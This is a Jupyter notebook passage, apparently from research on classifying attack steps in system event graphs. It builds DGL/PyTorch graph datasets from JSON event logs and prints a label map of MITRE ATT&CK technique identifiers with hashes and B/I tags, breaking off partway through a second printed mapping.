{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "02f1136c",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_3048961/892649855.py:7: DeprecationWarning: \n",
      "Pyarrow will become a required dependency of pandas in the next major release of pandas (pandas 3.0),\n",
      "(to allow more performant data types, such as the Arrow string type, and better interoperability with other libraries)\n",
      "but was not found to be installed on your system.\n",
      "If this would cause problems for you,\n",
      "please provide us feedback at https://github.com/pandas-dev/pandas/issues/54466\n",
      "        \n",
      "  import pandas as pd\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import json\n",
    "import pickle\n",
    "import random\n",
    "import logging\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from glob import glob\n",
    "from tqdm.notebook import tqdm\n",
    "from sklearn.decomposition import PCA\n",
    "from sklearn.metrics import classification_report\n",
    "\n",
    "import dgl\n",
    "import dgl.nn as dglnn\n",
    "from dgl.nn import GraphConv, GATConv, SAGEConv\n",
    "\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import torch.nn.functional as F\n",
    "from torch.optim import AdamW, lr_scheduler\n",
    "from torch.utils.data import Dataset, DataLoader\n",
    "from transformers import get_linear_schedule_with_warmup\n",
    "\n",
    "os.environ['CUDA_VISIBLE_DEVICES'] = \"0\"\n",
    "device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n",
    "logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO, datefmt='%Y-%m-%d %H:%M:%S') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0c4ff748-50ee-47f4-b061-5965fe828e78",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def build_dictionary(file_path):\n",
    "    with open(file_path, 'r') as file:\n",
    "        next(file)\n",
    "        # 使用正则表达式去除行末的数字\n",
    "        dictionary = {re.sub(r'\\s\\d+$', '', line.strip()): index for index, line in enumerate(file)}\n",
    "    return dictionary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "aeb4978b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# with open(\"./relations.txt\") as fp:\n",
    "#     relations = [r.strip() for r in fp.readlines()]\n",
    "    \n",
    "# with open(\"../data/3_openKE_2/label2id.txt\", \"r\") as fp:\n",
    "#     label2index = fp.load()\n",
    "# with open(\"./index2label.pkl\", \"rb\") as fp:\n",
    "#     index2label = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16c456ce",
   "metadata": {},
   "source": [
    "# Make dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "31b80e89",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_value(event):\n",
    "    global type2attr\n",
    "\n",
    "    srcUUID = event[\"srcNode\"][\"UUID\"]\n",
    "    srcType = event[\"srcNode\"][\"Type\"]\n",
    "    srcAttr = event[\"srcNode\"][type2attr[srcType]]\n",
    "    dstUUID = event[\"dstNode\"][\"UUID\"] if event[\"dstNode\"] != None else srcUUID\n",
    "    dstType = event[\"dstNode\"][\"Type\"] if event[\"dstNode\"] != None else srcType\n",
    "    dstAttr = event[\"dstNode\"][type2attr[dstType]] if event[\"dstNode\"] != None else srcAttr\n",
    "    return srcUUID, srcAttr, dstUUID, dstAttr, event[\"relation\"], event[\"label\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ad9dc377",
   "metadata": {},
   "outputs": [],
   "source": [
    "def make_dataset(dataset):\n",
    "    global node_ent2idx, edge_ent2idx, node_ent2emb, edge_ent2emb\n",
    "\n",
    "    data_list = []\n",
    "    for p in tqdm(dataset):\n",
    "        with open(p) as fp:\n",
    "            events = json.load(fp)\n",
    "            \n",
    "        nodes = set()\n",
    "        edges = []\n",
    "        relations = []\n",
    "        labels = []\n",
    "        uuid2res = {}\n",
    "        for e in events:\n",
    "            srcUUID, srcAttr, dstUUID, dstAttr, rel, label = get_value(e)\n",
    "\n",
    "            uuid2res[srcUUID], uuid2res[dstUUID] = srcAttr, dstAttr\n",
    "            nodes.add(srcUUID)\n",
    "            nodes.add(dstUUID)\n",
    "            edges.append((srcUUID, dstUUID))\n",
    "            relations.append(edge_ent2idx[rel])\n",
    "            labels.append(label2index[label])\n",
    "        nodes = list(nodes)  \n",
    "        node_feat = [torch.tensor(node_ent2emb[node_ent2idx[uuid2res[uuid]]], dtype=torch.float32) for uuid in nodes]\n",
    "        edge_attr = [torch.tensor(edge_ent2emb[idx], dtype=torch.float32) for idx in relations]\n",
    "\n",
    "        src = [nodes.index(src_uuid) for src_uuid, dst_uuid in edges]\n",
    "        dst = [nodes.index(dst_uuid) for src_uuid, dst_uuid in edges]\n",
    "        edge_index = torch.tensor([src, dst], dtype=torch.long)\n",
    "\n",
    "        \n",
    "        data_list.append({\n",
    "            \"labels\": labels,\n",
    "            \"num_nodes\": len(nodes),\n",
    "            \"node_feat\": node_feat,\n",
    "            \"edge_attr\": edge_attr,\n",
    "            \"edge_index\": edge_index\n",
    "        })\n",
    "    return data_list         "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab34d901-efd9-4d82-b363-45d02c98683c",
   "metadata": {},
   "source": [
    "### Directly change the entity to index and change the index into embedding\n",
    "- need ent -> index\n",
    "- need ent -> embedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d11ca333-c73c-4368-a704-9ae40d6e96f5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'T1112_34041639e6e501856ecaf5969ee29c76_I': 0,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I': 1,\n",
       " 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B': 2,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B': 3,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I': 4,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B': 5,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I': 6,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_B': 7,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_B': 8,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B': 9,\n",
       " 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B': 10,\n",
       " 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B': 11,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_B': 12,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B': 13,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I': 14,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_I': 15,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B': 16,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B': 17,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I': 18,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I': 19,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I': 20,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B': 21,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_B': 22,\n",
       " 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B': 23,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B': 24,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B': 25,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I': 26,\n",
       " 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B': 27,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B': 28,\n",
       " 'T1053.005_ee454be9197890de62705ce6255933fd_B': 29,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_I': 30,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B': 31,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I': 32,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_I': 33,\n",
       " 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B': 34,\n",
       " 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B': 35,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I': 36,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B': 37,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_I': 38,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I': 39,\n",
       " 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B': 40,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I': 41,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_I': 42,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I': 43,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_B': 44,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_B': 45,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I': 46,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I': 47,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I': 48,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_B': 49,\n",
       " 'T1531_b25ae80dad74142fafb510e9c1949ace_B': 50,\n",
       " 'T1047_6935e41353aa781bb723462d26114c44_B': 51,\n",
       " 'T1018_a44bb43474728496276d5d73aa14588f_B': 52,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_I': 53,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I': 54,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_I': 55,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B': 56,\n",
       " 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B': 57,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_B': 58,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B': 59,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B': 60,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I': 61,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I': 62,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_B': 63,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I': 64,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I': 65,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_B': 66,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B': 67,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_I': 68,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I': 69,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I': 70,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B': 71,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I': 72,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B': 73,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B': 74,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_I': 75,\n",
       " 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B': 76,\n",
       " 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B': 77,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I': 78,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B': 79,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I': 80,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_I': 81,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_I': 82,\n",
       " 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B': 83,\n",
       " 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B': 84,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B': 85,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I': 86,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I': 87,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_I': 88,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_B': 89,\n",
       " 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B': 90,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I': 91,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I': 92,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_B': 93,\n",
       " 'T1069.002_6103e503cb444bc7b4187704f2035708_B': 94,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_B': 95,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I': 96,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I': 97,\n",
       " 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B': 98,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I': 99,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I': 100,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I': 101,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I': 102,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I': 103,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I': 104,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B': 105,\n",
       " 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B': 106,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_I': 107,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B': 108,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B': 109,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B': 110,\n",
       " 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B': 111,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I': 112,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B': 113,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_B': 114,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_I': 115,\n",
       " 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B': 116,\n",
       " 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B': 117,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B': 118,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_B': 119,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_B': 120,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_I': 121,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I': 122,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B': 123,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I': 124,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B': 125,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B': 126,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B': 127,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_B': 128,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B': 129,\n",
       " 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B': 130,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B': 131,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_B': 132,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_B': 133,\n",
       " 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B': 134,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B': 135,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_I': 136,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B': 137,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B': 138,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_I': 139,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B': 140,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_B': 141,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B': 142,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_I': 143,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B': 144,\n",
       " 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B': 145,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_I': 146,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I': 147,\n",
       " 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B': 148,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I': 149,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_B': 150,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B': 151,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I': 152,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_I': 153,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B': 154,\n",
       " 'T1201_57296a2ddbeb7423c05feef2fe972111_B': 155,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B': 156,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I': 157,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I': 158,\n",
       " 'T1490_e90756bb6dcd21462dc4cc452661df91_B': 159,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_B': 160,\n",
       " 'T1007_d6bb2a19da7246731ed9c44831b135f8_B': 161,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B': 162,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_B': 163,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I': 164,\n",
       " 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B': 165,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_I': 166,\n",
       " 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B': 167,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B': 168,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_I': 169,\n",
       " 'T1531_aa6b15485a5f50ced34d87fda177b758_B': 170,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B': 171,\n",
       " 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B': 172,\n",
       " 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B': 173,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B': 174,\n",
       " 'T1016_71b3d2945679566b9d94d8cb11df4b70_B': 175,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B': 176,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B': 177,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B': 178,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_I': 179,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B': 180,\n",
       " 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B': 181,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_B': 182,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B': 183,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B': 184,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I': 185,\n",
       " 'T1490_c156ac5c9fa67080365268d95f29053d_B': 186,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B': 187,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I': 188,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I': 189,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_I': 190,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_I': 191,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B': 192,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_I': 193,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_B': 194,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I': 195,\n",
       " 'T1490_8467c994685ccf178db166964bd80fab_B': 196,\n",
       " 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B': 197,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B': 198,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I': 199,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_B': 200,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B': 201,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B': 202,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I': 203,\n",
       " 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B': 204,\n",
       " 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B': 205,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_I': 206,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I': 207,\n",
       " 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B': 208,\n",
       " 'T1482_cfb61005899996469ae3023796792ca5_B': 209,\n",
       " 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B': 210,\n",
       " 'T1003.003_f049b89533298c2d6cd37a940248b219_B': 211,\n",
       " 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B': 212,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I': 213,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_I': 214,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_B': 215,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_I': 216,\n",
       " 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B': 217,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B': 218,\n",
       " 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B': 219,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_B': 220,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I': 221,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I': 222,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_B': 223,\n",
       " 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B': 224,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I': 225,\n",
       " 'T1112_34041639e6e501856ecaf5969ee29c76_B': 226,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I': 227,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B': 228,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I': 229,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_I': 230,\n",
       " 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B': 231,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_I': 232,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B': 233,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_I': 234,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_B': 235,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I': 236,\n",
       " 'T1049_a14392d713dffba6a397682ff83259a0_B': 237,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_I': 238,\n",
       " 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B': 239,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B': 240,\n",
       " 'T1047_b0255b5120cbabc062d8d4510a142c3b_B': 241,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_B': 242,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_B': 243,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I': 244,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I': 245,\n",
       " 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B': 246,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_I': 247,\n",
       " 'T1018_ac20e592bc912bddff4d6b88289095f0_B': 248,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_I': 249,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B': 250,\n",
       " 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B': 251,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I': 252,\n",
       " 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B': 253,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I': 254,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B': 255,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I': 256,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_B': 257,\n",
       " 'O': 258,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I': 259,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_B': 260,\n",
       " 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B': 261,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B': 262,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B': 263,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_I': 264,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B': 265,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I': 266,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_I': 267,\n",
       " 'T1016_7d8ee68f0e9731db82964f558f614608_B': 268,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B': 269,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B': 270,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_B': 271,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_B': 272,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_B': 273}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/label2id.txt'  # 替換為您檔案的路徑\n",
    "label2index = build_dictionary(file_path)\n",
    "\n",
    "label2index"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "09049fca-0895-43d8-be49-3368f7c82ada",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{0: 'T1112_34041639e6e501856ecaf5969ee29c76_I',\n",
       " 1: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I',\n",
       " 2: 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B',\n",
       " 3: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B',\n",
       " 4: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I',\n",
       " 5: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B',\n",
       " 6: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I',\n",
       " 7: 'T1547.001_777043894e42d2aae3881e63f6c76d33_B',\n",
       " 8: 'T1047_f4b0b4129560ea66f9751275e82f6bab_B',\n",
       " 9: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B',\n",
       " 10: 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B',\n",
       " 11: 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B',\n",
       " 12: 'T1016_921055f4-5970-4707-909e-62f594234d91_B',\n",
       " 13: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B',\n",
       " 14: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I',\n",
       " 15: 'T1564.004_76b6066fe170d38215251102e42be973_I',\n",
       " 16: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B',\n",
       " 17: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B',\n",
